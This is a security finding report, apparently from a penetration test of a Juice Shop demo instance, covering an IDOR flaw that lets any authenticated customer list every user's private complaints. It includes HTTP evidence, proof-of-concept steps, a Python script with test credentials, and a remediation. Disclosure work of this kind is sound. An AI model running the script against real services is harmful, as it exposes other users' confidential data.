# IDOR: Any authenticated user can read all other users' complaints (GET /api/Complaints)

**ID:** vuln-0008
**Severity:** MEDIUM
**Found:** 2026-09-11 19:57:19 UTC
**Target:** http://host.docker.internal:3001
**Endpoint:** /api/Complaints
**Method:** GET
**CWE:** CWE-639
**CVSS:** 4.3
**Confidence:** High
**Fix Effort:** Low

## Description

`GET /api/Complaints` returns every user's B2B support complaint to any authenticated customer. The collection listing has no ownership or role filter, so private complaint messages — including file attachments metadata and the author's user ID — of all users are readable by a plain customer, even though per-object access is properly protected.

## Evidence

Victim B created a complaint moments before; attacker A (plain customer) reads it:

```json
GET /api/Complaints
Authorization: Bearer <A's customer JWT>

200 OK
{"data":[
  {"UserId":3,"id":1,"message":"I'll build my own eCommerce business! ...","file":null,...},
  {"UserId":27,"id":2,"message":"B private complaint with order details","file":null,...},
  {"UserId":27,"id":3,"message":"CONFIDENTIAL: B's private complaint XYZ","file":null,...}
]}
```

Controls that DO exist: `GET /api/Complaints/2` as A → 401; `PUT /api/Complaints/2` as A → 401; unauthenticated `GET /api/Complaints` → 401. Only the collection listing leaks.

## Impact

Any customer can read all other users' private support complaints. In a real deployment complaints routinely contain order numbers, refund disputes, and personal details, so this is unauthorized access to other users' confidential support communications. It also reveals complaint IDs and user IDs for further targeting.

## Counterevidence

Checked per-object access: GET/PUT /api/Complaints/2 as another customer both return 401 — single-record access is guarded, and the guard is verified to run before the handler. Checked the unauthenticated case: 401. Checked whether the listing is filtered per caller: it is not — a complaint created seconds earlier by the second test identity appeared verbatim in the first user's listing. The gap is confined to the collection endpoint's listing query, which omits the ownership filter that the per-object handlers have.

## What Would Change This Severity

If complaint records carried attached files readable cross-user or contained payment data, confidentiality impact would rise to High.

## Technical Analysis

The Complaint model's per-object handlers (`GET/PUT /api/Complaints/:id`) verify ownership, but the collection handler for `GET /api/Complaints` queries the model without a per-user `where` clause or role gate. Any authenticated JWT therefore receives all rows. The inconsistency between the guarded single-object endpoints and the unguarded listing is the root cause.

## Proof of Concept

1. Register attacker A and victim B; obtain JWTs for both. 2. As B, submit a complaint via `POST /api/Complaints` with a distinctive private message. 3. As A, request `GET /api/Complaints`. 4. Observe B's fresh complaint returned verbatim in A's response alongside all other users' complaints. 5. Confirm per-object protection: `GET /api/Complaints/<B's id>` as A returns 401, showing the flaw is the unfiltered listing query.

```python
import requests

BASE = "http://host.docker.internal:3001"
a = requests.post(BASE + "/rest/user/login", json={"email": "tester.recon@juice-sh.op", "password": "recon123456"}).json()["authentication"]["token"]
b = requests.post(BASE + "/rest/user/login", json={"email": "idor.b.jcgpw4pc@juice-sh.op", "password": "IdorTest123!"}).json()["authentication"]["token"]
H_A = {"Authorization": "Bearer " + a}
H_B = {"Authorization": "Bearer " + b}

new = requests.post(BASE + "/api/Complaints", headers=H_B,
                    json={"UserId": 27, "message": "CONFIDENTIAL marker complaint", "file": None}).json()["data"]

listing = requests.get(BASE + "/api/Complaints", headers=H_A).json()["data"]
print("victim's complaint visible to attacker:",
      any(c["message"] == "CONFIDENTIAL marker complaint" for c in listing))  # -> True
print("other users' complaints visible:", [(c["UserId"], c["message"][:30]) for c in listing])
print("per-object blocked:", requests.get(f"{BASE}/api/Complaints/{new['id']}", headers=H_A).status_code)  # -> 401
```

## Remediation

Apply the same ownership check used on the per-object handlers to the collection listing: filter `GET /api/Complaints` by the authenticated user's ID (or restrict it to admin roles), so a customer only ever sees their own complaints.

## Assumptions

Assumes the attacker holds any valid customer JWT (free self-registration). Demo instance; a production deployment would expose genuine customer support complaints, which frequently contain order numbers, refund details and personal narrative.
